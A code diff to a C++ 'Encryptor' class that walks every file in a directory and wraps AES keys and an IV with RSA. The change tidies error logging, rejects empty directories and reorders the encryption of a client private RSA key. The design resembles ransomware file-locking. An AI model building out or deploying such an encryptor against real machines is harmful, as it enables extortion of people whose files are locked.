@@ -60,11 +60,7 @@ void Encryptor::checkIfEncryptionFilesExists()
 {
     if ( butterfly::existsFile(butterfly::params::ENC_CPRIVATERSA_FILENAME) && butterfly::existsFile(butterfly::params::ENC_AESKEY_FILENAME) && butterfly::existsFile(butterfly::params::RSA_EKIV_FILENAME) )
     {
-        #ifdef LOGGING
-        LOG_ERROR("Aborting encryption because encryption files (" << butterfly::params::ENC_CPRIVATERSA_FILENAME << ", " << butterfly::params::ENC_AESKEY_FILENAME << ", " << butterfly::params::RSA_EKIV_FILENAME <<") already exists!")
-        #else
-        std::cerr << "Aborting encryption because encryption files already exists!" << std::endl;
-        #endif
+        std::cerr << "Aborting encryption because encryption files (" << butterfly::params::ENC_CPRIVATERSA_FILENAME << ", " << butterfly::params::ENC_AESKEY_FILENAME << ", " << butterfly::params::RSA_EKIV_FILENAME <<") already exists!" << std::endl;
         exit(1);
     }
 }
@@ -74,11 +70,16 @@ void Encryptor::invokeDir(const std::string &dirPath, bool protection)
     // Ensure that no encryption files already exists!
     checkIfEncryptionFilesExists();
 
-    // Encrypt the CPrivateRSA.pem String to CPrivateRSA.bin
-    encryptCPrivateRSA();
-
     // Get all files from provided directory path
     auto files =  DirectoryIterator::getAllFiles(dirPath);
+
+    if ( files.empty() )
+    {
+        throw EncryptorException("Provided Directory Path " + dirPath + " is empty!");
+    }
+
+    // Encrypt the CPrivateRSA.pem String to CPrivateRSA.bin
+    encryptCPrivateRSA();
 
     if ( !aes::AESEncryptor::initDone() )
     {
